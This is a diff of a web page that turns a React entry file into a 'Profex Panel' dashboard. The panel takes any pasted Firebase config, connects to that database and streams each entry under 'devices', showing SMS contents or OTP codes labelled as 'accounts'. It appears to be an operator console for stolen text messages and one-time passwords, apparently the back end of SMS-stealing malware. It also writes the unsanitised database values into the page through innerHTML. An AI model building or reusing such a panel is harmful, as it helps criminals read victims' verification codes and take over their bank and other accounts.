@@ -1,12 +1,139 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>FirePanel</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.jsx"></script>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profex Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white font-sans antialiased flex flex-col items-center justify-center min-h-screen p-4">
+
+    <!-- Main Container -->
+    <div class="w-full max-w-md bg-gray-800 rounded-xl shadow-2xl overflow-hidden border border-gray-700 pb-4">
+        
+        <!-- Header -->
+        <div class="bg-gray-950 p-6 text-center border-b border-gray-700 shadow-sm">
+            <h1 class="text-3xl font-bold tracking-widest text-blue-500 uppercase drop-shadow-md">Profex</h1>
+            <p class="text-gray-400 text-sm mt-1">Device Management Console</p>
+        </div>
+
+        <div class="p-5 space-y-5">
+            
+            <!-- Connect New Database Box -->
+            <div class="bg-gray-900 p-4 rounded-lg border border-gray-700">
+                <h3 class="text-sm font-semibold text-gray-200 mb-2 flex justify-between">
+                    Connect New Database 
+                    <span class="text-xs text-gray-500 font-normal">(JSON Format)</span>
+                </h3>
+                <textarea id="firebase-config-input" rows="5" class="w-full bg-gray-950 text-xs text-green-400 p-3 rounded border border-gray-600 focus:outline-none focus:border-blue-500 placeholder-gray-600 font-mono" placeholder='{
+  "apiKey": "...",
+  "databaseURL": "...",
+  "projectId": "..."
+}'></textarea>
+                <button id="connect-db-btn" class="w-full mt-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold py-2 px-4 rounded transition duration-200 shadow">
+                    Connect Live Data
+                </button>
+            </div>
+
+            <!-- Saved Accounts Box -->
+            <div class="bg-gray-900 p-4 rounded-lg border border-gray-700 min-h-[150px]">
+                <div class="flex justify-between items-center border-b border-gray-700 pb-3 mb-3">
+                    <h2 class="text-lg font-semibold text-gray-200">Saved Accounts</h2>
+                    <span id="account-count" class="bg-green-600 text-white text-xs px-2.5 py-1 rounded-full font-medium shadow">0 accounts</span>
+                </div>
+                
+                <!-- Dynamic Data List -->
+                <div id="account-list" class="text-gray-500 text-sm flex flex-col gap-3">
+                    <div class="text-center py-4" id="empty-state">No active connections</div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Firebase SDK & Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+        let dbCount = 0;
+        let totalDevicesAcrossDBs = {}; // Har DB ke count ko track karne ke liye
+
+        document.getElementById('connect-db-btn').addEventListener('click', () => {
+            const configInput = document.getElementById('firebase-config-input').value.trim();
+            if(!configInput) return alert("Please paste Firebase JSON config first.");
+            
+            try {
+                const dynamicConfig = JSON.parse(configInput);
+                
+                dbCount++;
+                const appName = "LiveDB_" + dbCount;
+                
+                // Naya app initialize karna
+                const dynamicApp = initializeApp(dynamicConfig, appName);
+                const dynamicDb = getDatabase(dynamicApp);
+
+                // UI Updates
+                document.getElementById('firebase-config-input').value = ""; // Textarea clear
+                document.getElementById('empty-state') ? document.getElementById('empty-state').remove() : null;
+
+                // Naye DB ke liye ek dedicated container banani
+                const listContainer = document.getElementById('account-list');
+                const dbContainer = document.createElement('div');
+                dbContainer.id = `container-${appName}`;
+                dbContainer.className = "flex flex-col gap-2";
+                listContainer.appendChild(dbContainer);
+
+                // Database reference (Aap ise apne folder name se replace kar sakte hain)
+                const dataRef = ref(dynamicDb, 'devices'); 
+
+                onValue(dataRef, (snapshot) => {
+                    const data = snapshot.val();
+                    dbContainer.innerHTML = ''; // Sirf is DB ka UI refresh hoga
+                    
+                    if (data) {
+                        const keys = Object.keys(data);
+                        totalDevicesAcrossDBs[appName] = keys.length;
+                        
+                        keys.forEach(key => {
+                            const info = data[key];
+                            const item = document.createElement('div');
+                            item.className = "bg-gray-800 p-3 rounded text-left border border-l-4 border-l-blue-500 border-gray-700 text-gray-300 text-xs shadow-md";
+                            
+                            // Aapke database structure ke hisaab se values change karein
+                            const dataText = info.smsData || info.otp || JSON.stringify(info);
+
+                            item.innerHTML = `
+                                <div class="flex justify-between items-center mb-1">
+                                    <span class="text-blue-400 font-bold uppercase tracking-wide">ID: ${key.substring(0, 8)}...</span>
+                                    <span class="text-[10px] bg-gray-700 px-2 py-0.5 rounded text-gray-400">${appName}</span>
+                                </div>
+                                <div class="text-gray-300 font-mono mt-1 whitespace-pre-wrap break-words bg-gray-900 p-2 rounded border border-gray-700">${dataText}</div>
+                            `;
+                            dbContainer.appendChild(item);
+                        });
+                    } else {
+                        totalDevicesAcrossDBs[appName] = 0;
+                    }
+                    
+                    updateTotalCount();
+                });
+
+                alert(`Database [${appName}] Connected Successfully! Listening for live data...`);
+
+            } catch (error) {
+                alert("Invalid JSON Format! Please check the configuration format.");
+                console.error("Firebase Error:", error);
+            }
+        });
+
+        function updateTotalCount() {
+            let sum = 0;
+            for (let key in totalDevicesAcrossDBs) {
+                sum += totalDevicesAcrossDBs[key];
+            }
+            document.getElementById('account-count').innerText = `${sum} accounts`;
+        }
+    </script>
+</body>
 </html>
